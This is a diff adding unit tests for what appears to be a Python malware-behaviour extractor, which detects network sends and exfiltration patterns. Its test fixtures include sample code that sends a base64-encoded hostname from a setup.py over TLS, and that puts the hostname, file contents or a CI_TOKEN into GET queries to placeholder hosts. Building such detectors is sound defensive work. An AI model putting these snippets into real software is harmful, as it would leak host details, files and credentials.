@@ -335,3 +335,113 @@ def test_generic_environment_value_is_not_labeled_as_credential_exfiltration():
     assert not any(
         path.motif == "credential_or_file_exfil" for path in generic.behavior_paths
     )
+
+
+def test_local_aliases_do_not_leak_across_functions_or_shadowed_modules():
+    source = """
+import requests
+import socket
+
+def make_socket():
+    stream = socket.socket()
+
+def consume(stream):
+    stream.send(b"hello")
+
+def shadow_parameter(socket):
+    socket.socket().send(b"hello")
+
+def shadow_module():
+    requests = object()
+    requests.post("https://example.invalid")
+"""
+    result = PythonExtractor().analyze_source(source, "scope.py")
+    network = [event for event in result.events if event.op.startswith("NETWORK_")]
+    assert network == []
+
+
+def test_class_aliases_do_not_leak_into_method_or_following_module_scope():
+    source = """
+import socket
+
+class Client:
+    stream = socket.socket()
+
+    def method(self):
+        stream.send(b"hello")
+
+def later():
+    stream.send(b"hello")
+"""
+    result = PythonExtractor().analyze_source(source, "class_scope.py")
+    network = [event for event in result.events if event.op.startswith("NETWORK_")]
+    assert network == []
+
+
+def test_verified_ssl_socket_wrapper_preserves_network_receiver_type():
+    source = """
+import base64
+import socket
+import ssl
+
+def report():
+    payload = base64.b64encode(socket.gethostname().encode())
+    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
+    stream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    secure = context.wrap_socket(stream, server_hostname="example.invalid")
+    secure.connect(("example.invalid", 443))
+    secure.send(payload)
+"""
+    result = PythonExtractor().analyze_source(source, "setup.py")
+    operations = [event.op for event in result.events]
+    assert "NETWORK_RECEIVE" in operations
+    assert "NETWORK_SEND" in operations
+    path = next(
+        p for p in result.behavior_paths if p.motif == "fingerprinting_transfer"
+    )
+    assert path.evidence_kind == "dataflow"
+    assert path.confidence == "high"
+
+
+def test_untyped_wrap_socket_name_does_not_create_network_events():
+    source = """
+def forward(wrapper, stream, payload):
+    secure = wrapper.wrap_socket(stream)
+    secure.send(payload)
+"""
+    result = PythonExtractor().analyze_source(source, "wrapper.py")
+    assert not any(event.op.startswith("NETWORK_") for event in result.events)
+
+
+def test_get_query_tracks_host_and_file_provenance_without_secret_escalation():
+    host = PythonExtractor().analyze_source(
+        'import requests, socket\nrequests.get("https://x.invalid/?h=" + socket.gethostname())\n'
+    )
+    file = PythonExtractor().analyze_source(
+        'import requests\ndef f(path):\n data=open(path).read()\n requests.get("https://x.invalid/?d=" + data)\n'
+    )
+    secret = PythonExtractor().analyze_source(
+        'import os, requests\nrequests.get("https://x.invalid/?t=" + os.getenv("CI_TOKEN"))\n'
+    )
+    assert any(
+        p.motif == "fingerprinting_transfer" and p.evidence_kind == "dataflow"
+        for p in host.behavior_paths
+    )
+    assert any(
+        p.motif == "file_to_network" and p.evidence_kind == "dataflow"
+        for p in file.behavior_paths
+    )
+    assert not any(p.motif == "credential_or_file_exfil" for p in secret.behavior_paths)
+
+
+def test_dotted_import_binds_top_level_name_without_repeating_submodule():
+    direct = PythonExtractor().analyze_source(
+        'import urllib.request\nurllib.request.urlretrieve("https://x.invalid/a", "a.zip")\n'
+    )
+    aliased = PythonExtractor().analyze_source(
+        'import urllib.request as req\nreq.urlretrieve("https://x.invalid/a", "a.zip")\n'
+    )
+    for result in (direct, aliased):
+        receives = [event for event in result.events if event.op == "NETWORK_RECEIVE"]
+        assert len(receives) == 1
+        assert receives[0].target == "https://x.invalid/a"
